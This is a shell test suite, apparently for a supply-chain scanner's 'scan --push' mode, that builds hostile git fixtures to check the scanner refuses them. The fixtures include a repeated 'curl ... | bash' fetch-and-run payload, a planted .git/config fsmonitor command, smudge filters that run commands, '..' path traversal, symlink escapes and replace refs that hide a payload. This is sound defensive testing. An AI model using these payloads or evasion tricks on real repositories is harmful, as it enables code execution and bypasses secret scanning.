( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload beside a path that differs from it only in case" \
  || ok "scan --push refuses a payload a case collision would hide"
sub="$( cd "$sp" && printf '100644 blob %s\tx\n' "$okb" | git mktree )"
c="$( cd "$sp" && git commit-tree -m dir "$(printf '100644 blob %s\tA.sh\n040000 tree %s\ta.sh\n' "$pay" "$sub" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload beside a directory that differs from it only in case" \
  || ok "scan --push refuses a payload a file-and-directory collision would hide"
rm -rf "$sp"

# git refuses to check out a path with a .git component, in any case, because it would configure the
# repository it lands in, and git mktree builds one. The scan refuses such a commit before writing
# anything, so a planted .git/config never becomes the scan's own configuration, whose
# core.fsmonitor would run. The no-command assertion passes before the change too, since the old
# scan read the working tree; it fails if the extraction ever reads the planted file.
sp="$(fixture node-ts)"
blob="$( cd "$sp" && printf '[core]\n\tfsmonitor = "touch %s/pwned; false"\n' "$sp" | git hash-object -w --stdin )"
sub="$( cd "$sp" && printf '100644 blob %s\tconfig\n' "$blob" | git mktree )"
c="$( cd "$sp" && git commit-tree -m planted "$(printf '040000 tree %s\t.git\n' "$sub" | git mktree)" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
[ ! -e "$sp/pwned" ] && ok "scan --push never runs configuration a pushed tree plants" \
  || bad "scan --push" "a planted .git/config ran a command"
[ "$rc" -ne 0 ] && case "$out" in *"git refuses to check out"*) ok "scan --push refuses a commit holding a .git path" ;;
  *) bad "scan --push" "refused a planted .git path but said: $out" ;; esac \
  || bad "scan --push" "allowed a commit holding .git/config"
c="$( cd "$sp" && git commit-tree -m planted "$(printf '040000 tree %s\t.GIT\n' "$sub" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a commit holding .GIT/config" \
  || ok "scan --push refuses a .git path in any case"
rm -rf "$sp"

# A key added and then deleted inside the push reaches the remote in history.
sp="$(fixture node-ts)"
printf 'x\n' > "$sp/deploy.key"
( cd "$sp" && git add deploy.key && git commit -qm key && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit added and a later one deleted" ;;
  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
  || bad "scan --push" "allowed a push whose history carries deploy.key"
# Once the remote holds the commit that added it, the key is not this push's to carry.
( cd "$sp" && git update-ref refs/remotes/origin/main HEAD~1 )
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && ok "scan --push leaves history the remote already holds alone" \
  || bad "scan --push" "refused over a key the remote-tracking branch already holds"
rm -rf "$sp"

# A key the remote already holds, changed in the push and then deleted, still sends the new key.
sp="$(fixture node-ts)"
printf 'old\n' > "$sp/deploy.key"
( cd "$sp" && git add deploy.key && git commit -qm key && git update-ref refs/remotes/origin/main HEAD \
  && printf 'new\n' > deploy.key && git commit -qam "rotate key" && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit changed and a later one deleted" ;;
  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
  || bad "scan --push" "allowed a push whose history carries a changed deploy.key"
rm -rf "$sp"

# A key a merge commit itself adds, in its resolution, shows in no plain diff of the history.
sp="$(fixture node-ts)"
( cd "$sp" && git switch -q -c side && printf 's\n' > s.txt && git add s.txt && git commit -qm side \
  && git switch -q main && printf 'm\n' > m.txt && git add m.txt && git commit -qm m \
  && git merge -q --no-ff --no-commit side && printf 'k\n' > prod.key && git add prod.key && git commit -qm merge \
  && git rm -q prod.key && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"prod.key"*) ok "scan --push refuses a key file a merge commit added" ;;
  *) bad "scan --push" "refused, but did not name prod.key: $out" ;; esac \
  || bad "scan --push" "allowed a push whose merge commit added prod.key"
rm -rf "$sp"

# The tip's paths are looked up exactly, not through the filesystem: on a case-folding disk TEST.key
# would read as present because the tip holds test.key. The two commits are built with plumbing,
# since neither a working tree nor an index on such a disk can hold both names.
sp="$(fixture node-ts)"
mkdir -p "$sp/.keel"; printf 'x\n' > "$sp/test.key"
printf 'test.key an expired fixture, no live credential\n' > "$sp/.keel/scan-allow"
( cd "$sp" && git add test.key .keel/scan-allow && git commit -qm fixture && git update-ref refs/remotes/origin/main HEAD ) >/dev/null 2>&1
live="$( cd "$sp" && printf 'live\n' | git hash-object -w --stdin )"
c1="$( cd "$sp" && git commit-tree -p HEAD -m "add TEST.key" "$( { git ls-tree HEAD; printf '100644 blob %s\tTEST.key\n' "$live"; } | git mktree )" )"
c2="$( cd "$sp" && git commit-tree -p "$c1" -m "drop TEST.key" 'HEAD^{tree}' )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c2" 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"TEST.key"*) ok "scan --push looks the tip's paths up exactly, case and all" ;;
  *) bad "scan --push" "refused, but did not name TEST.key: $out" ;; esac \
  || bad "scan --push" "allowed TEST.key because the tip holds test.key"
rm -rf "$sp"

# The history walk is checked: a walk that stops partway, on an object missing from a partial or
# damaged clone, fails the scan rather than reading as a clean history.
sp="$(fixture node-ts)"
( cd "$sp" && printf 'a\n' > a.txt && git add a.txt && git commit -qm a \
  && printf 'b\n' > b.txt && git add b.txt && git commit -qm b ) >/dev/null 2>&1
t="$( cd "$sp" && git rev-parse 'HEAD~1^{tree}' )"
rm -f "$sp/.git/objects/${t:0:2}/${t:2}"
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"could not read the history"*) ok "scan --push fails when the history cannot be read" ;;
  *) bad "scan --push" "failed on an unreadable history but said: $out" ;; esac \
  || bad "scan --push" "passed a history git could not walk"
rm -rf "$sp"

# Executable bits come from the commit. In a plugin repository the scanner refuses an executable
# outside its allowed set, and it reads the mode from the index of the copy it scans. This case
# passes before the change too, since the working tree carries the same bit; it is here to fail if
# the copy loses the mode.
sp="$(fixture node-ts)"
mkdir -p "$sp/.claude-plugin" "$sp/docs"
printf '{"name":"example","version":"0.0.1"}\n' > "$sp/.claude-plugin/plugin.json"
printf '#!/bin/sh\necho hi\n' > "$sp/docs/helper.sh"; chmod +x "$sp/docs/helper.sh"
( cd "$sp" && git add .claude-plugin/plugin.json docs/helper.sh && git commit -qm exec ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"
case "$out" in *"docs/helper.sh [structural-executable]"*) ok "scan --push reads executable bits from the pushed commit" ;;
  *) bad "scan --push" "did not flag an executable the commit carries: $out" ;; esac
rm -rf "$sp"

# A path with a .. component is refused as git refuses to check it out: it made the rewrite step
# write a file outside the scan's own directory, anywhere this user can write.
sp="$(fixture node-ts)"
pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a .. path tries to place outside the scan
sub="$( cd "$sp" && printf '100644 blob %s\tvictim\n' "$pay" | git mktree )"
c="$( cd "$sp" && git commit-tree -m dotdot "$(printf '040000 tree %s\t..\n' "$sub" | git mktree)" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"git refuses to check out"*) ok "scan --push refuses a commit holding a .. path" ;;
  *) bad "scan --push" "refused a .. path but said: $out" ;; esac \
  || bad "scan --push" "allowed a commit holding a .. path"
rm -rf "$sp"

# The rules read a file's name as well as its content, and the names come from the commit, not from
# the disk: A.key beside a.KEY, the same blob, left only a.KEY on a case-folding disk, which the key
# rule does not match.
sp="$(fixture node-ts)"
kb="$( cd "$sp" && printf 'x\n' | git hash-object -w --stdin )"
c="$( cd "$sp" && git commit-tree -m names "$(printf '100644 blob %s\tA.key\n100644 blob %s\ta.KEY\n' "$kb" "$kb" | git mktree)" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"A.key [structural-secret-material]"*) ok "scan --push reads every name the commit holds, not the one the disk kept" ;;
  *) bad "scan --push" "refused, but not for A.key: $out" ;; esac \
  || bad "scan --push" "allowed A.key beside a.KEY"
rm -rf "$sp"

# A key path that changes type in the push, a symlink on the remote becoming a real key file, is a
# change git reports as T, not A or M, and deleting it later still sends the key.
sp="$(fixture node-ts)"
( cd "$sp" && ln -s elsewhere deploy.key && git add deploy.key && git commit -qm link && git update-ref refs/remotes/origin/main HEAD \
  && rm deploy.key && printf 'real\n' > deploy.key && git add deploy.key && git commit -qm "real key" \
  && git rm -q deploy.key && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"deploy.key"*) ok "scan --push refuses a key file a pushed commit changed from a symlink" ;;
  *) bad "scan --push" "refused, but did not name deploy.key: $out" ;; esac \
  || bad "scan --push" "allowed a push whose history turns a symlink into deploy.key"
rm -rf "$sp"

# A tip holding a key path as a directory does not hold the key: deploy.key/notes.txt is not a key
# file, and the key a pushed commit added under that name is still in history.
sp="$(fixture node-ts)"
( cd "$sp" && printf 'x\n' > deploy.key && git add deploy.key && git commit -qm key && git rm -q deploy.key \
  && mkdir deploy.key && printf 'n\n' > deploy.key/notes.txt && git add deploy.key/notes.txt && git commit -qm dir ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"deploy.key [structural-secret-material]"*) ok "scan --push counts only a file in the tip as holding a key path" ;;
  *) bad "scan --push" "refused, but not for deploy.key: $out" ;; esac \
  || bad "scan --push" "allowed a key the tip replaced with a directory of the same name"
rm -rf "$sp"

# The history walk reads no porcelain configuration: with log.showRoot false, git log shows nothing
# a root commit added, so a key added in the first commit of a new history and deleted later passed.
sp="$(fixture node-ts)"
( cd "$sp" && git config log.showRoot false && git checkout -q --orphan fresh && git rm -rqf . \
  && printf 'x\n' > root.key && git add root.key && git commit -qm root \
  && git rm -q root.key && printf 'a\n' > a.txt && git add a.txt && git commit -qm "drop key" ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin fresh 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"root.key"*) ok "scan --push reads a root commit's additions whatever log.showRoot says" ;;
  *) bad "scan --push" "refused, but did not name root.key: $out" ;; esac \
  || bad "scan --push" "allowed a key a root commit added, with log.showRoot false"
rm -rf "$sp"

# Replace refs change what git reads and not what push sends: a scan of a commit replaced by a clean
# one read the clean one, while a push delivers the payload.
sp="$(fixture node-ts)"
printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload a replace ref tries to hide
( cd "$sp" && git add payload.sh && git commit -qm bad ) >/dev/null 2>&1
bad_c="$( cd "$sp" && git rev-parse HEAD )"
( cd "$sp" && git rm -q payload.sh && git commit -qm good && git replace "$bad_c" HEAD ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin "$bad_c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload a replace ref stands in front of" \
  || ok "scan --push reads the commit being pushed, not a replacement"
rm -rf "$sp"

# The files are written with no filter the pushed tree names: git archive ran a smudge command a
# pushed .gitattributes selected. This case passes before the change too, since the old scan read
# the working tree; it fails if the extraction ever runs one.
sp="$(fixture node-ts)"
printf 'a\n' > "$sp/a.txt"; printf 'a.txt filter=demo\n' > "$sp/.gitattributes"
( cd "$sp" && git add a.txt .gitattributes && git commit -qm attr && git config filter.demo.smudge "touch $sp/smudged; cat" ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 )
[ ! -e "$sp/smudged" ] && ok "scan --push runs no filter the pushed tree names" \
  || bad "scan --push" "a filter the pushed .gitattributes named ran during the scan"
rm -rf "$sp"

# No symlink is ever written: on a case-folding disk a symlink x beside a directory X/ replaced
# the directory, and the files under X/ were then written through it, outside the scan. The
# outside directory is this fixture's own. It stays untouched before the change too, since the old
# scan read the working tree; the refusal is what fails first.
sp="$(fixture node-ts)"; mkdir -p "$sp-out"
pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a symlink tries to write outside the scan
ysub="$( cd "$sp" && printf '100755 blob %s\ty\n' "$pay" | git mktree )"
lnk="$( cd "$sp" && printf '%s' "$sp-out" | git hash-object -w --stdin )"
c="$( cd "$sp" && git commit-tree -m link "$(printf '040000 tree %s\tX\n120000 blob %s\tx\n' "$ysub" "$lnk" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a directory beside a symlink of the same name folded" \
  || ok "scan --push refuses a directory beside a symlink of the same name folded"
[ -z "$(ls -A "$sp-out")" ] && ok "scan --push writes nothing outside its own directory" \
  || bad "scan --push" "the scan wrote outside its directory: $(ls -A "$sp-out")"
rm -rf "$sp" "$sp-out"

# Where the filesystem keeps an executable bit, the disk must match the commit's mode: Run.sh at
# 100755 beside run.sh at 100644, the same blob, left one file on a case-folding disk that neither
# name found executable, so the rules scoped to executables never ran over it.
sp="$(fixture node-ts)"
net="$( cd "$sp" && printf 'curl -s https://example.com/version\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow a network call the push scan must see in an executable
c="$( cd "$sp" && git commit-tree -m modes "$(printf '100755 blob %s\tRun.sh\n100644 blob %s\trun.sh\n' "$net" "$net" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed an executable beside a same-content file that differs only in case and mode" \
  || ok "scan --push refuses a case pair that differs in mode"
rm -rf "$sp"

# .keel/scan-allow is honoured only where the commit holds that exact path as a file. A case-folding
# disk answered to it for .keel/SCAN-ALLOW, and a symlink by that name was written as a file holding
# its target, so either handed the scan an allow list the commit did not hold. The commit's own allow
# list, held as a file, is still honoured.
sp="$(fixture node-ts)"
kb="$( cd "$sp" && printf 'x\n' | git hash-object -w --stdin )"
al="$( cd "$sp" && printf 'secret.key an expired fixture\n' | git hash-object -w --stdin )"
ksub="$( cd "$sp" && printf '100644 blob %s\tSCAN-ALLOW\n' "$al" | git mktree )"
c="$( cd "$sp" && git commit-tree -m alias "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$ksub" "$kb" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "honoured .keel/SCAN-ALLOW as the allow list" \
  || ok "scan --push honours no allow list the commit does not hold by its exact name"
lsub="$( cd "$sp" && printf '120000 blob %s\tscan-allow\n' "$al" | git mktree )"
c="$( cd "$sp" && git commit-tree -m link "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$lsub" "$kb" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "honoured a symlink named .keel/scan-allow as the allow list" \
  || ok "scan --push honours no allow list held as a symlink"
gsub="$( cd "$sp" && printf '100644 blob %s\tscan-allow\n' "$al" | git mktree )"
c="$( cd "$sp" && git commit-tree -m allowed "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$gsub" "$kb" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && ok "scan --push honours an allow list the commit holds as a file" \
  || bad "scan --push" "refused a key the commit's own .keel/scan-allow lists"
# A history path with a . component names the tip's own file when looked up as <commit>:<path>, so a
# live key an intermediate commit held at ./secret.key read as the allowed fixture at secret.key.
( cd "$sp" && git update-ref refs/remotes/origin/main "$c" )
live="$( cd "$sp" && printf 'live\n' | git hash-object -w --stdin )"
dsub="$( cd "$sp" && printf '100644 blob %s\tsecret.key\n' "$live" | git mktree )"
mid="$( cd "$sp" && git commit-tree -p "$c" -m mid "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n040000 tree %s\t.\n' "$gsub" "$kb" "$dsub" | git mktree)" )"
tip="$( cd "$sp" && git commit-tree -p "$mid" -m tip "$c^{tree}" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$tip" 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"./secret.key"*) ok "scan --push checks a history path with a . component outright" ;;
  *) bad "scan --push" "refused, but did not name ./secret.key: $out" ;; esac \
  || bad "scan --push" "allowed a live key an intermediate commit held at ./secret.key"
rm -rf "$sp"

# A SHA-256 repository is scanned, not refused: the scan repository names objects the way the pushed
# one does. This case passes before the change too, since the old scan read the working tree.
sp="$(mktemp -d)"
( cd "$sp" && git init -q --object-format=sha256 -b main . && git config user.email t@t.t && git config user.name t \
  && printf 'a\n' > a.txt && git add a.txt && git commit -qm init ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && ok "scan --push reads a SHA-256 repository" \
  || bad "scan --push" "refused a clean commit in a SHA-256 repository"
rm -rf "$sp"

# In a linked worktree git runs the hook with GIT_DIR set. The scan's own git commands must not
# write into that repository. The commit scanned is main, which holds a file the worktree's HEAD
# does not, so a git add that leaked into the worktree's index would show in its status. This case
# passes before the change too; it fails if the scan's git environment is not cleared.
sp="$(fixture node-ts)"
( cd "$sp" && git worktree add -q "$sp-wt" -b wt && printf 'b\n' > b.txt && git add b.txt && git commit -qm b ) >/dev/null 2>&1
( cd "$sp-wt" && GIT_DIR="$(git rev-parse --absolute-git-dir)" "$KEEL" scan --push origin main >/dev/null 2>&1 )
[ -z "$( cd "$sp-wt" && git status --porcelain )" ] \
  && ok "scan --push in a linked worktree leaves that worktree's index alone" \
  || bad "scan --push" "the linked worktree's status changed: $( cd "$sp-wt" && git status --porcelain | head -3 )"
rm -rf "$sp" "$sp-wt"

# The scan repository reads names as the commit has them. git on macOS precomposes the names it
# reads from disk, so a decomposed café.key was listed twice, as the tracked name and as an
# untracked precomposed one, and the copy the allow list did not name stopped the scan. Elsewhere
# git precomposes nothing, and this case passes before the change too.
sp="$(fixture node-ts)"
kb="$( cd "$sp" && printf 'x\n' | git hash-object -w --stdin )"
nfd="$(printf 'cafe\314\201.key')"
al="$( cd "$sp" && printf '%s an expired fixture\n' "$nfd" | git hash-object -w --stdin )"
ksub="$( cd "$sp" && printf '100644 blob %s\tscan-allow\n' "$al" | git mktree )"
c="$( cd "$sp" && git commit-tree -m nfd "$(printf '040000 tree %s\t.keel\n100644 blob %s\t%s\n' "$ksub" "$kb" "$nfd" | git mktree)" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$c" 2>&1 )" \
  && ok "scan --push reads a decomposed name once, as the commit holds it" \
  || bad "scan --push" "refused an allow-listed key with a decomposed name: $out"
rm -rf "$sp"

# A git older than 2.32 ignores GIT_CONFIG_GLOBAL and reads ~/.gitconfig, and every git reads the
# default global attributes file under XDG_CONFIG_HOME, so this user's own filter still ran over the
# pushed tree. A shim that drops GIT_CONFIG_GLOBAL stands in for the older git.
sp="$(fixture node-ts)"; fh="$(mktemp -d)"; shim="$(mktemp -d)"
mkdir -p "$fh/.config/git"
printf '[filter "demo"]\n\tsmudge = touch %s/smudged; cat\n' "$fh" > "$fh/.gitconfig"
printf '* filter=demo\n' > "$fh/.config/git/attributes"
printf '#!/bin/sh\nunset GIT_CONFIG_GLOBAL\nexec %s "$@"\n' "$(command -v git)" > "$shim/git"; chmod +x "$shim/git"
( cd "$sp" && printf 'a\n' > a.txt && git add a.txt && git commit -qm a ) >/dev/null 2>&1
( cd "$sp" && HOME="$fh" XDG_CONFIG_HOME="$fh/.config" PATH="$shim:$PATH" "$KEEL" scan --push origin HEAD >/dev/null 2>&1 )
[ ! -e "$fh/smudged" ] && ok "scan --push runs no filter this user's global configuration names" \
  || bad "scan --push" "a filter from the global config and attributes ran during the scan"
rm -rf "$sp" "$fh" "$shim"

# An allow-list entry covers the version of the path the tip holds, the one that was reviewed, and
# no other. A live key a pushed commit put at the allowed path passed when a later commit put the
# fixture back, or deleted it, before the tip.
sp="$(fixture node-ts)"
mkdir -p "$sp/.keel"; printf 'fixture\n' > "$sp/test.key"
printf 'test.key an expired fixture, no live credential\n' > "$sp/.keel/scan-allow"
( cd "$sp" && git add test.key .keel/scan-allow && git commit -qm fixture && git update-ref refs/remotes/origin/main HEAD \
  && printf 'live\n' > test.key && git commit -qam live && printf 'fixture\n' > test.key && git commit -qam restore ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"test.key [structural-secret-material]"*) ok "scan --push refuses a version of an allowed key the tip does not hold" ;;
  *) bad "scan --push" "refused, but not for test.key: $out" ;; esac \
  || bad "scan --push" "allowed a live key at an allowed path because a later commit restored the fixture"
( cd "$sp" && git rm -q test.key && git commit -qm drop ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a live key at an allowed path because a later commit deleted it" \
  || ok "scan --push refuses a version of an allowed key the tip deleted"
# The fixture changed once, to the version the tip holds, is the reviewed version and passes.
( cd "$sp" && git reset -q --hard origin/main && printf 'fixture 2\n' > test.key && git commit -qam "new fixture" ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && ok "scan --push allows an allowed key changed to the version the tip holds" \
  || bad "scan --push" "refused an allowed fixture the push changed once, to the tip's version"
rm -rf "$sp"

# A history version of an allowed key is covered only where .keel/scan-allow pins it, the path then
# the version's blob: a first push to a remote with no fetched refs walks the whole history, so a
# fixture that was ever regenerated was otherwise refused on every such push. A pin names one
# version, so a live key a pushed commit put at the same path is still refused.
sp="$(fixture node-ts)"
mkdir -p "$sp/.keel"; printf 'fixture 1\n' > "$sp/test.key"
printf 'test.key an expired fixture, no live credential\n' > "$sp/.keel/scan-allow"
( cd "$sp" && git add test.key .keel/scan-allow && git commit -qm fixture && printf 'fixture 2\n' > test.key && git commit -qam regenerated ) >/dev/null 2>&1
old="$( cd "$sp" && git rev-parse HEAD~1:test.key )"
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed an unpinned history version of an allowed key" \
  || ok "scan --push refuses a history version of an allowed key no pin names"
printf 'test.key %s the first fixture, regenerated\n' "$old" >> "$sp/.keel/scan-allow"
( cd "$sp" && git commit -qam pin ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] && case "$out" in *"ALLOW test.key $old"*) ok "scan --push allows a history version .keel/scan-allow pins, and says so" ;;
  *) bad "scan --push" "allowed the pinned version without listing it: $out" ;; esac \
  || bad "scan --push" "refused a history version .keel/scan-allow pins: $out"
( cd "$sp" && printf 'live\n' > test.key && git commit -qam live && printf 'fixture 2\n' > test.key && git commit -qam restore ) >/dev/null 2>&1
out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"test.key [structural-secret-material]"*) ok "scan --push refuses a version of an allowed key its pin does not name" ;;
  *) bad "scan --push" "refused, but not for test.key: $out" ;; esac \
  || bad "scan --push" "allowed a live key because another version of its path is pinned"
rm -rf "$sp"

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
